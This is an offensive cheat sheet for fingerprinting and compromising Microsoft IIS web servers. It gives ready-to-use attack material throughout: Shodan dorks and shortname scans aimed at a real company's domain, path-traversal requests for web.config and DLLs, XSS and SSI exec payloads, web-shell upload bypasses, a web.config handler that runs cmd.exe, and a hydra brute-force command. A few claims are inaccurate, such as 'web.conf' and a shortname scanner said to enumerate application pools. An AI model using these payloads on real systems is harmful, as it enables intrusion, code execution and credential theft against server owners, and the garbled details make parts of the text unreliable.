This cheat sheet covers a range of techniques and methods to identify, exploit, and compromise Microsoft IIS (Internet Information Services) servers. IIS is widely used to serve web applications, making it a common target for security testing and exploitation. The guide includes fingerprinting methods, misconfigurations, common vulnerabilities, and advanced exploitation tactics that can lead to information disclosure, file uploads, directory traversal, RCE, and authentication bypass.

# Fingerprinting IIS - Start by using Nuclei to detect IIS servers. Check out this simple template:

`$ nuclei -l targets -t templates/iis-shortname.yaml -silent`

## Server response headers:

```
$ nc -v domain.com 80
$ openssl s_client -connect example.com:443

HTTP/1.1 200 OK

Server: Microsoft-IIS
X-Powered-By: ASP.NET
```

## Internal IP Address disclosure:

```
$ curl -v --http1.0 http://example.com

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```

## Shodan dorks:

```
http.title:"IIS"
ssl:"Tesla Inc." http.title:"IIS"
ssl.cert.subject.CN:"tesla.com" http.title:"IIS"
ssl.cert.issuer.CN:"tesla.com" http.title:"IIS"
```

## By using an automation tool:

`cat urls.txt | sXtract -ip -q "http.title:"IIS"`

## HTTPAPI 2.0 404 Error

If you see an error like the following one:

![image](https://github.com/user-attachments/assets/9302d3da-7a32-4ff0-bbd8-bea7f4668e2f)

It means that the server didn't receive the correct domain name inside the Host header. In order to access the web page you could take a look to the served SSL Certificate and maybe you can find the domain/subdomain name in there. If it isn't there you may need to brute force VHosts until you find the correct one. 

![image](https://github.com/user-attachments/assets/bda1985a-0198-43c7-be4c-bde47567b4e3)

## Fuzzing approach:

```
/trace.axd
/trace.axd?id=1
/admin/help.cgi
/admin/help.cgi.bak
/admin/WS_FTP.LOG
/adovbs.inc
/confirm.asp.bak 
/default.asp.bak
/login.asp.bak
/pindex.asp.bak
/rootlogin.asp.bak
/rootlogin.asp.old
/_vti_pvt/service.cnf 
/include/common.inc
/WS_FTP.LOG
/service.cnf
/_vti_pvt/service.cnf

or try next wordlists:
- iis.txt
- iisfinal.txt
- god.txt

and with next extensions: 

.asp,.aspx,.ashx,.asmx,.wsdl,.wadl,.config,.xml,.zip,.txt,.dll,.json
```

## Run Nuclei templates:

```
$ nuclei -l domains.txt -t templates/ -tags microsoft,windows,asp,aspx,iis,azure -silent -pc 1 -H "Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0" -H "X-Forwarded-For: 127.0.0.1"
$ nuclei -l domains.txt -t templates/ -silent
```

## Use shortscan or other shortname scanners to enumerate directory and file shortnames:

```
IIS Tilde Enumeration (Burp Extension)
https://github.com/projectmonke/shortnameguesser
https://github.com/bitquark/shortscan

> shortscan https://url/
> shortscan https://tesla.com/
> shortscan https://tesla.com/admin/
> shortscan https://tesla.com/admin/dashboard

Note: any valid dir endpoint such as 403,401,200 etc, scan that endpoint again!!

JetBrains dotPeek -> to analyze files such as dll file and export the source of that file

```

![image](https://github.com/user-attachments/assets/e348cbed-67f2-4349-85e8-0fbe14eeda66)

![image](https://github.com/user-attachments/assets/97103bd4-ab96-475e-9590-f202b7e01288)

![image](https://github.com/user-attachments/assets/136d5860-da66-4a95-9952-4bafb64ef40f)

![image](https://github.com/user-attachments/assets/b2444e85-6da7-4a3c-947c-b316101063fb)

![image](https://github.com/user-attachments/assets/dce6329d-7fb3-44b5-9fef-bd448d254232)

![image](https://github.com/user-attachments/assets/70b39cea-a422-4f28-9c3c-c151207ef6a7)

![image](https://github.com/user-attachments/assets/e6367f59-3af5-4c22-8973-3c622837c481)

![image](https://github.com/user-attachments/assets/96e14bc8-bb20-4981-80dc-5833215590d1)

## Reverse proxy misconfiguration:

```
If you can find a place where there is a reverse proxy on IIS, you can traverse on the backend server using ..%2f
http://10.0.0.1/admin/ -> http://10.0.0.1/
try /anything/..%2fadmin -> http://10.0.0.1/admin
```

## Basic Authentication bypass (IIS 7.5)

You can try to mix this vulnerability and the last one to find new folders and bypass the authentication.

```
/admin:$i30:$INDEX_ALLOCATION/admin.php
/admin::$INDEX_ALLOCATION/admin.php
```

## Grab the machine keys from web.conf to pivot to RCE:

`IIS is one of the easiest targets to get RCE if you can leak the web.conf file, you normally have RCE via deserialization (VIEWSTATE parameter)`

# IIS web server (File Upload)

Developers usually include only well-known and obvious extensions in the blacklist. In the article, I want to consider not the wide-spreading file types.

For demonstration PoC, I used the following payloads:

```
Basic XSS payload: <script>alert(1337)</script>
XML-based XSS payload: <a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(1337)</a:script>
```

By default, IIS responds with the text/html content-type on the file types, which presented in list below:

Extensions with basic vector:

```
.cer
.hxt
.htm
```

![image](https://github.com/user-attachments/assets/9963328e-4fee-498f-821e-e1e7f75a2246)

Therefore, it is possible to paste the basic XSS vector in the uploaded file, and we will get an alert box in browser after opening the document. The list below includes extensions on which IIS responds with the content-type which allow to execute XSS via XML-based vector.

Extensions with XML-based vector:

```
.dtd
.mno
.vml
.xsl
.xht
.svg
.xml
.xsd
.xsf
.svgz
.xslt
.wsdl
.xhtml
```

![image](https://github.com/user-attachments/assets/2e8e7da5-b8e9-4d43-877b-380b8005104c)

By default, IIS also supports SSI, however exec section is prohibited for the security reasons

Extensions for SSI:

```
.stm
.shtm
.shtml
```

![image](https://github.com/user-attachments/assets/831b95ae-2c63-42f0-ba5e-13f0ee1868ec)

```
shell.aspx
shell.aspx.
shell.aspx..
shell.aspx...

and other extensions (.asp, .ashx, .config)
```

## Upload shell via path traversal:

`Create shell file with next filename ../../../../shell.aspx and upload`

## Path traversal via vulnerable parameter:

```
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
GET /download_page?id=web.config HTTP/1.1
GET /download_page?id=../web.config HTTP/1.1
GET /download_page?id=../../web.config HTTP/1.1
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
GET /download_page?id=..%2f..%2fMinded/Views/web.config HTTP/1.1
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
GET /download_page?id=..%2f..%2fbin/System.Web.Mvc.dll HTTP/1.1
GET /download_page?id=..%2f..%2fbin/System.Web.Mvc.Ajax.dll HTTP/1.1
GET /download_page?id=..%2f..%2fbin/System.Web.Mvc.Html.dll HTTP/1.1
GET /download_page?id=..%2f..%2fbin/System.Web.Optimization.dll HTTP/1.1
GET /download_page?id=..%2f..%2fbin/System.Web.Routing.dll HTTP/1.1
```

## HPP Pollution for WAF bypass:

`> https://site.com/page?parameter=<svg/&parameter=onload=alert(1)>`

## Bypass File Upload Restrictions Using Alternate Data Streams (ADS):

IIS often restricts certain file types for upload. You can bypass this restriction by using NTFS Alternate Data Streams.

`Upload file as: shell.aspx::$DATA`

This will still treat the file as shell.aspx, allowing it to be executed.

## Directory Traversal via URL Encoding:

You can bypass weak URL encoding protections by encoding traversal sequences.

`/%2e%2e/%2e%2e/windows/win.ini`

## CVE-2017-7269 (WebDAV Remote Code Execution on IIS 6.0):

IIS 6.0 with WebDAV enabled has a buffer overflow vulnerability that can lead to RCE.

```
POST /<Buffer_Overflow_Payload> HTTP/1.1
Host: victim.com
Translate: f
```

## MS-DOS Device Names to Bypass Access Controls:

Using reserved MS-DOS device names like CON, PRN, AUX, and NUL, you can bypass certain upload restrictions.

```
shell.aspx::$DATA
CON.asp
PRN.aspx

```

## Bypass Request Filtering with Null Byte Injection:

Sometimes, appending a null byte to file extensions can bypass strict file extension filtering.

`/file.asp%00.jpg`

## IIS HTTP/2 Vulnerabilities:

IIS versions with HTTP/2 support are prone to various vulnerabilities like denial of service.

Use tools like:

`h2csmuggle - a tool to test HTTP/2 downgrades and smuggling.`

## IIS Hidden Endpoints Discovery (PROPFIND method):

Using HTTP methods like PROPFIND, you can sometimes discover hidden directories and files in IIS.

`curl -X PROPFIND http://example.com/`

## Server-Side Include (SSI) Injection:

If the server allows SSI, try injecting SSI directives in file upload or input fields.

`<!--#exec cmd="dir"-->`

## Enumerating IIS Application Pools:

By exploiting vulnerable IIS configurations, you can enumerate Application Pools (AppPools) running under specific privileges.

`Use metasploit module: auxiliary/scanner/http/iis_shortname_scanner`

## ViewState MAC Bypass to Gain RCE:

If you can leak machine keys or the ViewState MAC isn't properly validated, you can tamper with the ViewState to achieve RCE.

Use tools like:

`ysoserial - payload generator for .NET serialization flaws.`

## Misconfigured ISAPI Filters/Extensions Leading to RCE:

If ISAPI filters or extensions are improperly configured, it may be possible to upload and execute malicious DLLs.

```Check for .dll files under `/scripts`, `/bin`, `/filters`.```

## IIS Request Smuggling:

Vulnerabilities in IIS related to HTTP/2 or improper request validation can lead to request smuggling attacks.

Test using:

`smuggler.py - Tool for HTTP request smuggling testing.`

## Bypass URL Rewrite Module Restrictions:

By manipulating the URL or headers, you can bypass IIS URL rewrite restrictions.

Try adding:

`/..;/`

at the end of URLs to evade path normalization.

## Bypass Output Caching Vulnerabilities:

IIS may cache certain pages even when it shouldnâ€™t. By manipulating cache headers, you can sometimes access sensitive data.

```
Cache-Control: public
Pragma: cache

```

## RCE via Malicious .config Uploads:

Uploading a .config file (e.g., web.config) with malicious settings could allow you to change server-side behavior, leading to RCE.

Example payload in web.config:

```
<configuration>
  <system.webServer>
    <handlers>
      <add name="Shell" path="shell.aspx" verb="*" modules="IsapiModule" scriptProcessor="cmd.exe /c calc.exe" resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>

```

## IIS Buffer Overflow via Long URL Paths:

Some older IIS versions are vulnerable to buffer overflow attacks by providing an overly long URL.

```
GET /<very_long_path> HTTP/1.1
Host: example.com

```

## Inspecting IIS Debug/Trace Files for Sensitive Information:

Check if debugging or trace logs (trace.axd) are enabled. These files might leak sensitive information like internal paths, stack traces, or even credentials.

```
/trace.axd
/elmah.axd

```

## Brute-Force Authentication on IIS Windows Authentication:

IIS sometimes relies on Windows authentication. Brute-force the login if the basic authentication mechanism is in use.

Use tools like:

`hydra -l user -P passlist.txt http-get://target.com`

